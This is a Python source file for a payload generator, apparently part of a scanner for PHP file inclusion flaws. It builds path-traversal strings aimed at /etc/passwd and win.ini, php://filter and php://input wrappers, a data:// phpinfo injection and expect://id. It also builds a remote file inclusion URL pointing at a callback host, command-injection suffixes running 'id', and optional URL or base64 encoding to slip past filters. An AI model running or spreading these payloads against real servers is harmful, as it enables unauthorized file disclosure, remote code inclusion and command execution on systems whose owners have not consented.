import base64
import os
import urllib.parse
from typing import List

class PayloadGenerator:
    def __init__(self, args):
        self.args = args
        self.wordlist = self.load_wordlist()
    
    def load_wordlist(self) -> List[str]:
        path = self.args.wordlist if self.args.wordlist else (
            "src/wordlists/long.txt" if self.args.use_long else "src/wordlists/short.txt"
        )
        if os.path.exists(path):
            with open(path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        print("Զգուշացում. բառերի ցուցակի ֆայլը չի գտնվել, օգտագործվում է դեֆոլտ պայլոադներ")
        return [
            "../../etc/passwd",
            "../../windows/win.ini",
            "../../../../../../etc/passwd",
            "../../../../../../windows/win.ini"
        ]
    
    def generate(self, technique: str) -> List[str]:
        payloads = []
        
        if technique == "trunc":
            payloads = self.wordlist
        elif technique == "filter":
            payloads = [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-decode/resource=index.php"
            ]
        elif technique == "input":
            payloads = ["php://input"]
        elif technique == "data":
            payloads = ["data://text/plain,<?php phpinfo(); ?>"]
        elif technique == "expect":
            payloads = ["expect://id"]
        elif technique == "rfi":
            payloads = [f"http://{self.args.callback}/test.php"] if self.args.callback else []
        elif technique == "cmd":
            payloads = [";id", "|id", "&id"]
        elif technique == "file":
            payloads = ["file:///etc/passwd", "file:///c:/windows/win.ini"]
        elif technique == "heuristics":
            payloads = ["index.php", "../index.php", "../../index.php"]
        
        if self.args.quick:
            payloads = payloads[:min(5, len(payloads))]
        
        if self.args.n == "U":
            payloads = [urllib.parse.quote(p) for p in payloads]
        elif self.args.n == "B":
            payloads = [base64.b64encode(p.encode()).decode() for p in payloads]
        
        return payloads